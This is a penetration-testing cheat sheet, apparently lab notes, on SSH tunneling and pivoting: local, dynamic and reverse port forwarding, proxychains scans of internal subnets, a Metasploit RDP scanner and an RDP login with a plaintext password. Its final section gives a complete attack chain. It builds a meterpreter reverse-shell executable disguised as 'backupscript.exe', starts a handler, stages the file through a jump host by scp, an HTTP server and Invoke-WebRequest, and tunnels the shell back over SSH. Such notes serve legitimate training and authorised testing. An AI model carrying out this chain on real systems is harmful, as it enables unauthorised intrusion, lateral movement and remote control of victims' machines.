# SSH Tunneling

## SSH Local Port Forwarding

```bash
ssh -L <lport>:localhost:<rport> roger@<rhost>

# Multi-port example
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Confirm port forwarded
netstat -antp | grep <lport>
# or
nnmap -v -sV -p<lport> localhost
```

## SSH Dynamic Port Forwarding

```bash
# Standard
ssh -D 9001 roger@10.0.0.2

# start a background dynamic SOCKS5 proxy on localhost:1080
ssh -f -N -D 127.0.0.1:1080 user@jumphost
# -f = fork to background, -N = no remote command, -D = dynamic SOCKS port
```

### Nmap w/ proxychains

Can only perform full tcp scan, proxychains cannot interpret partial packets.

```bash
# Check proxychains and add if not there
tail -4 /etc/proxychains.conf
[ProxyList]
socks4 	127.0.0.1 9050
# socks5  127.0.0.1 1080
# and set: proxy_dns = yes   # (so DNS goes through the SOCKS proxy)

# Scan entire network segment
proxychains4 nmap -v -sn 172.16.0.1-200

# Scan a single windows host - defender blocks icmp
proxychains4 nmap -v -Pn -sT 172.16.0.13

# Network sweep
# safe: TCP connect scan through SOCKS (slower than native but works)
proxychains4 nmap -sT -Pn -p22,80,139,445,3306 -oA pivot_nmap_important 10.10.0.0/24

# full TCP port sweep (may be slow through proxy)
proxychains4 nmap -sT -Pn -p- --min-rate=100 -oA pivot_nmap_all 10.10.0.0/24
```

### Metasploit w/ proxychains

Using rdp as an example

```bash
proxychains msfconsole

> use auxiliary/scanner/rdp/rdp_scanner
> set rhosts 172.16.0.13
> run
|S-chain|-<>-127.0.0.1:9001-<><>-172.16.0.5:3389-<><>-OK

# xfreerdp in if results are +
proxychains xfreerdp3 /v:172.16.0.13 /u:roger /p:p@$$w0rd 
```

## Remote/Reverse Port Forwarding with SSH

Connect back a reverse shell from an unreachable network

host <-- victim <-- remote victim

Use the port 8080 on the victim server to forward all of our reverse  packets to our attack hosts' 8000 port, where Metasploit listener is running.

### Windows Payload with msvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Conf and Starting multi/handler

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

### Transferring Payload to Jump Host --> Target

```bash
# Attack host
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Send payload from jump host
python3 -m http.server 8123
```

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Reverse port forward

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

# Execute payload on Windows host and check Jump logs
```